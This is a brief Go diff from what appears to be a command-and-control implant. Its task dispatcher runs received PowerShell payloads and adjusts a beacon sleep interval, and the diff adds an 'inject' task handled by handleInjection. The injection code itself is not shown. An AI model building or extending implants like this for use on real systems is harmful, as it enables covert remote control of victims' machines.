@@ -85,6 +85,8 @@ func Execute(task *comms.TaskPayload, apiKey string) *comms.ResultRequest {
 		output, err = executePowerShell(task.Payload)
 	case "sleep_update":
 		output = "sleep interval updated"
+	case "inject":
+		output, err = handleInjection(task.Payload)
 	default:
 		err = fmt.Errorf("unknown task type: %s", task.Type)
 	}
